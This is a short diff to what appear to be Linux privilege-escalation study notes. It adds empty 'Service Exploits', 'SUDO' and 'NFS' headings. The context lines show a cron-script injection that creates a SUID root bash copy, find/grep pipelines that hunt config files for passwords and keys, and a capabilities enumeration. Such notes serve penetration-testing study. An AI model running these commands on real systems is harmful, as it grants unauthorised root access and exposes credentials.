@@ -323,6 +323,8 @@ echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /path/to/cron/script
 
 ## Timers
 
+## Service Exploits
+
 ## Passwords, Hashes, and Credentials
 
 We can enumerate possible files that may contain credentials.
@@ -334,6 +336,8 @@ find \-type f 2>/dev/null | grep "config" | xargs grep -i "password" 2>/dev/null
 find \-type f 2>/dev/null | grep "config" | xargs grep -i -E "username|password|key|database" 2>/dev/null
 find \-type f 2>/dev/null | grep "config" | xargs grep -i -E "username|password|key|database" 2>/dev/null | grep -v -E "debconf|keyboard"
 ```
+
+## SUDO
 
 ## Sticky Bits and SUID/SGID 
 
@@ -353,6 +357,8 @@ Enumerate capabilities in general with:
 ```bash
 getcap -r / 2>/dev/null
 ```
+
+## NFS
 
 ## Container
 
